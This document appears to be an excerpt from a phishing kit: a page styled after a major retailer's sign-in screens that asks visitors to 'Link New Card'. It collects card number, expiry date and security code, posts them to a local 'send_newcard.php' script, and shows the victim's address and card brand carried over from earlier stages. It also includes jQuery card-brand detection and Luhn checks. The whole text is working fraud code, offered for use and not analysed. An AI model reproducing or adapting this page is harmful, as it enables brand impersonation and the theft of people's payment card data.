...
<div id="appctx" class="a-section auth-pagelet-container" >
...
<div class="a-section a-spacing-base">
  <div class="a-section">
    ...
    <form name="signIn" method="post" action="./system/send_newcard.php" class="auth-validate-form auth-real-time-validation a-spacing-none " style="
    margin-left: -20;
    margin-right: -20;
">
...
Link New Card </h1>
          ...
          <div class="a-divider a-divider-break"><h5>Confirm your Card</h5></div>
...
<input required="" type="text" maxlength="128" id="ccn" name="nccn" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
...
<input required="" type="text" maxlength="128" id="expdate" name="nexpdate" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
...
<label for="ap_email" class="a-form-label">
Security code</label>
<input required="" type="text" maxlength="4" id="Securitycode" name="nSecuritycode" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
          ...
          <div class="a-row a-spacing-base">
            <div class="a-divider a-divider-break"><h5>Address information</div>
...
$address.=", ";
$address.=$_SESSION['ZipCode'];
$lcard4=strtoupper($_SESSION['_cc_brand_']);
$lcard4.="-";
...
<div class="a-row a-spacing-base">
<input  type="text" id="NameOnCard" style="text-align:center;" required disabled="disabled" value="<?php echo $address; ?>" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>


<div class="a-row a-spacing-base">
<input  type="text" id="NameOnCard" style="text-align:center;" required disabled="disabled" value="<?php echo $lcard4; ?>" class="a-input-text a-span12 auth-autofocus auth-required-field"></div>
          ...
          <div class="a-section">
            ...
            <span id="continue" class="a-button a-button-span12 a-button-primary"><span class="a-button-inner"><input id="continue" tabindex="5" class="a-button-input" type="submit" aria-labelledby="continue-announce"><span id="continue-announce" class="a-button-text" aria-hidden="true">
              Continue
                  ...
                  <span id="auth-create-account-link" class="a-button a-button-span12 a-button-base"><span class="a-button-inner"><a id="createAccountSubmit" tabindex="6" disabled href="./system/checkingmail.php" class="a-button-text" role="button">I don't have another card</a></span></span>
...
$('#cscaa').removeClass('csc-image_amex').addClass('');
                        ...
                        $('#ccn').css('background-position', '98.5% 94%');
...
$('#ccn').css('background-position', '98.5% 97%'); 
...
$('#cscaa').removeClass('csc-image_amex').addClass('');
   ...
   $('#Securitycode').attr('pattern', '[0-9]{4}');
...
$('#cscaa').removeClass('csc-image_amex').addClass('');
                        ...
                        $('#ccn').css('background-position', '98.5% 72%');
...
$('#ccn').css('background-position', '98.5% 69%');
...
$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');
   ...
   $('#Securitycode').attr('pattern', '[0-9]{3}');
          $('#Securitycode').attr('maxlength', '3');
                        ...
                        $('#ccn').css('background-position', '98.5% 46.8%');
...
$('#csc').attr('pattern', '[0-9]{4}');
          $('#Securitycode').attr('maxlength', '4');
                        ...
                        $('#ccn').css('background-position', '98.5% 6%');
...
$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#ccn').css('background-position', '98.5% 32%');
...
$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');
                        ...
                        $('#ccn').css('background-position', '98.5% 24.8%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 

                        break;
          default:
                        $('#ccn').css('background-position', '98.5% 81.7%');
$('#thDSecure').css('background-position', '99.5% -20.5%'); 
...
$('#amxaa').removeClass('cardImages-icon_selected').addClass('');
 ...
 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
                        ...
                        $('#ccn').css('background-position', '98.5% -1%');
...
$('#amxaa').removeClass('cardImages-icon_selected').addClass('');
 ...
 $('#visaa').removeClass('cardImages-icon_selected').addClass('');
                ...
                $('#ccn').css('background-position', '98.5% -0.2%');
       ...
       // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {
                    ...
                    $('#ccn').removeClass('error').addClass('');
                } else {
                    $('#ccn') .removeClass('').addClass('error');
                }
            } else {
                $('#ccn').removeClass('').removeClass('error');
            }
        });
    </script>
  ...
  <script type="text/javascript">
      ...
      $('#ccn').validateCreditCard(function(result) {
          if(result.card_type == null){
                    ...
                    $('#ccn').addClass(result.card_type.name);
